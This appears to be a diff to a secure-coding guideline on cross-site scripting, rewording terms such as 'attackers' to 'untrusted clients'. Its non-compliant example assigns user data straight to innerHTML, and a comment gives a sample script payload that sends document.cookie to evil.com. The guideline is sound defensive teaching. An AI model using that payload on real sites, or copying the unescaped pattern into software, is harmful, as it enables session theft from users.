@@ -9,12 +9,12 @@ tags: security, xss, injection, output-encoding, html, csp, react
 
 **Impact: CRITICAL — CWE-79**
 
-Cross-site scripting (XSS) allows attackers to inject JavaScript into pages viewed by other users, enabling session theft, credential harvesting, keylogging, and account takeover. All dynamic data rendered in HTML must be escaped. Avoid `innerHTML`, `dangerouslySetInnerHTML`, and template literals in HTML without sanitization.
+Cross-site scripting (XSS) allows untrusted clients to inject JavaScript into pages viewed by other users, enabling session theft, credential harvesting, keylogging, and account takeover. All dynamic data rendered in HTML must be escaped. Avoid `innerHTML`, `dangerouslySetInnerHTML`, and template literals in HTML without sanitization.
 
-**Vulnerable (unescaped user data in HTML):**
+**Non-compliant (unescaped user data in HTML):**
 
 ```typescript
-// ❌ Direct innerHTML — executes attacker's script
+// ❌ Direct innerHTML — executes untrusted client's script
 document.getElementById('name').innerHTML = user.name
 // user.name = '<script>fetch("evil.com?c="+document.cookie)</script>'
 
